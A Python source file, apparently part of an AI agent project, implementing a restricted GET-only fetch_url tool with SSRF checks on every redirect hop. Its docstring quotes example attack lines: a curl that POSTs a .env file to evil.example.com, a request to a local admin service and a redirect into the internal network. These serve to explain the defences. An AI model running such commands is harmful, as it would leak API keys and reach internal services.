"""fetch_url —— 只读地抓一个网址的文本内容。

## 为什么需要它，以及为什么不是「给 run_shell 加 curl」

WorkBuddy 那套 skill 全都靠 `curl` 抓数据（RSS、arXiv、GitHub API）。
但本项目的 `run_shell` 是**命令白名单**制，只有 echo/date/dir/ls/pwd。

最省事的做法是往白名单里加 `curl`。**但那等于把沙箱拆了**：

    curl -X POST -d @.env https://evil.example.com     ← 一行就把 API Key 发出去
    curl http://127.0.0.1:8080/admin                    ← 访问内网服务
    curl -o C:\\Windows\\... https://...                 ← 写任意文件

curl 能读能写能上传能访问内网，它的能力远超「抓个 RSS」。
所以正确的做法**不是放宽旧路径，而是新增一条能力刚好够的新路径**：
只 GET、只 http/https、拒绝内网、限制大小、限制超时。

这就是第四铁律的实践：**安全边界不能只守一条路，但也不该为了开一条新路把旧门拆了。**

## 三个必须做的防护

1. **只 GET** —— 不给 POST，就没有「用请求体带数据出去」的能力。
2. **拒绝私有地址** —— 否则模型可以借这个工具去戳你本机的服务、路由器后台、
   云服务器的 metadata 接口（169.254.169.254）。这类攻击叫 SSRF。
3. **限制大小和长度** —— 一个 10 MB 的页面塞进上下文，一次就烧掉几万 token。

## 一个容易忽略的坑：重定向

    https://public.example.com/redirect → http://127.0.0.1:8080/admin

第一次请求是公网地址，检查通过了；但它 302 到内网。
所以**不能开自动跟随**，每跳一次都要重新校验。
"""

from __future__ import annotations

import ipaddress
import json
import socket
import time
from html.parser import HTMLParser
from urllib.parse import urljoin, urlparse

import httpx

from agent.tools.base import Tool

MAX_BYTES = 2 * 1024 * 1024      # 单次响应最多读 2 MB
MAX_REDIRECTS = 5
DEFAULT_CHARS = 15000            # 返回给模型的字符上限
TIMEOUT = 25.0
RETRIES = 2                      # 代理偶尔 502，重试一次往往就好了


# 进程级共享 client。
# 为什么要共享：新建 Client 会重新初始化 SSLContext，实测约 900ms；
# 复用之后本地回环只要 1ms。这个项目里「一次问答抓 3-5 个网页」是常态，
# 每次重建等于白付 3-5 秒。
_client: httpx.Client | None = None


def get_client() -> httpx.Client:
    global _client
    if _client is None:
        _client = httpx.Client(
            timeout=TIMEOUT,
            # 关键：**不跟随重定向**。每一次跳转都要重新做 SSRF 检查，
            # 否则「公网地址 → 302 到内网」就能绕过防护。
            follow_redirects=False,
            headers={
                "User-Agent": "Mozilla/5.0 (compatible; mini-agent/0.12)",
                "Accept": "application/json, text/html, application/xml;q=0.9, */*;q=0.8",
            },
        )
    return _client


def _get_with_retry(url: str) -> httpx.Response:
    """GET 一次，代理 502 / 连接抖动时重试。

    为什么专门处理 502：这台机器走本地代理，
    它偶尔会返回 502（上游还没就绪），隔一秒再试就通了。
    这不是我们的 bug，但如果不重试，用户看到的就是「抓取失败」。
    """
    last_exc: Exception | None = None
    for attempt in range(RETRIES):
        try:
            resp = get_client().get(url)
            if resp.status_code in (502, 503, 504) and attempt + 1 < RETRIES:
                time.sleep(1.0)
                continue
            return resp
        except (httpx.ProxyError, httpx.ConnectError, httpx.ReadTimeout) as exc:
            last_exc = exc
            if attempt + 1 < RETRIES:
                time.sleep(1.0)
                continue
            raise
    if last_exc is not None:
        raise last_exc
    raise httpx.ProxyError("重试后仍然失败")


class _TextExtractor(HTMLParser):
    """把 HTML 变成可读文本。

    不引 bs4 —— 只需要「去掉标签和脚本、保留正文」，
    标准库的 HTMLParser 够用，少一个依赖。

    script/style 里的内容必须整段丢掉：否则返回的「正文」里
    会混进几十 KB 的 JavaScript，把有效的文字淹没。
    """

    SKIP = {"script", "style", "noscript", "svg", "head"}
    BLOCK = {"p", "div", "br", "li", "tr", "h1", "h2", "h3", "h4", "h5", "h6", "section"}

    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self._skip_depth = 0
        self._parts: list[str] = []

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        if tag in self.SKIP:
            self._skip_depth += 1
        elif tag in self.BLOCK:
            self._parts.append("\n")

    def handle_endtag(self, tag: str) -> None:
        if tag in self.SKIP and self._skip_depth:
            self._skip_depth -= 1
        elif tag in self.BLOCK:
            self._parts.append("\n")

    def handle_data(self, data: str) -> None:
        if not self._skip_depth:
            text = data.strip()
            if text:
                self._parts.append(text)

    def text(self) -> str:
        raw = " ".join(self._parts).replace(" \n ", "\n")
        lines = [" ".join(ln.split()) for ln in raw.splitlines()]
        return "\n".join(ln for ln in lines if ln)


def _is_public_host(host: str) -> tuple[bool, str]:
    """判断主机是不是「公网可访问」。返回 (是否允许, 原因)。"""
    if not host:
        return False, "网址里没有主机名"

    # 直接写 ID 的（http://127.0.0.1, http://192.168.1.1）
    try:
        ip = ipaddress.ip_address(host.strip("[]"))
    except ValueError:
        # 是域名，先解析
        try:
            resolved = socket.gethostbyname(host)
        except OSError as exc:
            return False, f"域名解析失败：{exc}"
        try:
            ip = ipaddress.ip_address(resolved)
        except ValueError:
            return False, f"解析结果不是合法 IP：{resolved}"

    if ip.is_loopback:
        return False, f"{ip} 是本机地址（loopback）"
    if ip.is_private:
        return False, f"{ip} 是内网地址"
    if ip.is_link_local:
        return False, f"{ip} 是链路本地地址（云 metadata 常用这个段）"
    if ip.is_reserved or ip.is_multicast:
        return False, f"{ip} 是保留/组播地址"
    return True, ""


def _decode(raw: bytes, content_type: str) -> str:
    charset = "utf-8"
    for part in content_type.split(";")[1:]:
        if "charset=" in part.lower():
            charset = part.split("=", 1)[1].strip().strip('"\'')
            break
    try:
        return raw.decode(charset, errors="replace")
    except LookupError:
        return raw.decode("utf-8", errors="replace")


class FetchUrlTool(Tool):
    name = "fetch_url"

    # 只读 + 无共享状态 → 可以和同批其他只读工具并行
    concurrency_safe = True

    description = (
        "用 GET 抓取一个网址的文本内容（只读）。可以抓网页、RSS、JSON API。"
        "会自动把 HTML 转成纯文本、把 JSON 缩进好。"
        "**只能 GET，不能提交表单、不能登录、不能发 POST。**"
        "抓 RSS/API 时直接传完整 URL。"
    )

    parameters = {
        "type": "object",
        "properties": {
            "url": {
                "type": "string",
                "description": "完整网址，必须以 http:// 或 https:// 开头",
            },
            "max_chars": {
                "type": "integer",
                "description": f"返回的最大字符数，默认 {DEFAULT_CHARS}",
            },
        },
        "required": ["url"],
    }

    def run(self, url: str, max_chars: int = DEFAULT_CHARS) -> str:
        url = str(url or "").strip()
        parsed = urlparse(url)

        # ── 1. 基本校验 ──
        if parsed.scheme not in ("http", "https"):
            return f"[错误] 只支持 http/https，收到的是「{parsed.scheme or '空'}」"
        if not parsed.hostname:
            return "[错误] 网址里没有主机名"

        allowed, reason = _is_public_host(parsed.hostname)
        if not allowed:
            return f"[错误] 出于安全限制，不能访问：{reason}"

        try:
            limit = max(500, min(int(max_chars or DEFAULT_CHARS), 60000))
        except (TypeError, ValueError):
            limit = DEFAULT_CHARS

        # ── 2. 手动跟随重定向（每一跳都重新校验）──
        current = url
        for hop in range(MAX_REDIRECTS + 1):
            try:
                resp = _get_with_retry(current)
            except httpx.TimeoutException:
                return f"[错误] 请求超时（{TIMEOUT:.0f}s）：{current}"
            except httpx.HTTPError as exc:
                return f"[错误] 请求失败：{type(exc).__name__}: {exc}"

            if resp.is_redirect:
                location = resp.headers.get("location", "")
                if not location:
                    return "[错误] 服务器返回了跳转但没给目标地址"
                current = urljoin(current, location)
                nxt = urlparse(current)
                if nxt.scheme not in ("http", "https"):
                    return f"[错误] 跳转到了不支持的协议：{nxt.scheme}"
                ok, why = _is_public_host(nxt.hostname or "")
                if not ok:
                    # 公网 → 内网的跳转，是典型的 SSRF 手法
                    return f"[错误] 跳转目标被安全策略拒绝：{why}（{current}）"
                continue
            break
        else:
            return f"[错误] 跳转次数超过 {MAX_REDIRECTS} 次"

        # ── 3. 状态码 ──
        if resp.status_code >= 400:
            return f"[错误] HTTP {resp.status_code} {resp.reason_phrase}：{current}"

        raw = resp.content
        if len(raw) > MAX_BYTES:
            raw = raw[:MAX_BYTES]

        ctype = resp.headers.get("content-type", "").lower()
        body = _decode(raw, ctype)

        # ── 4. 按类型整形 ──
        if "json" in ctype or body.lstrip().startswith(("{", "[")):
            try:
                body = json.dumps(json.loads(body), ensure_ascii=False, indent=2)
            except json.JSONDecodeError:
                pass
        elif "html" in ctype:
            parser = _TextExtractor()
            try:
                parser.feed(body)
                body = parser.text()
            except Exception:  # noqa: BLE001 —— 解析失败就当纯文本返回，别让工具整体失败
                pass

        body = body.strip()
        if not body:
            return f"（{current} 返回了空内容，content-type={ctype or '未知'}）"

        truncated = len(body) > limit
        if truncated:
            body = body[:limit]

        header = f"来源：{current}\n类型：{ctype or '未知'}\n\n"
        footer = f"\n\n[内容已截断：共 {len(body) if not truncated else '更长'} 字符，只返回前 {limit} 字符]" if truncated else ""
        return header + body + footer
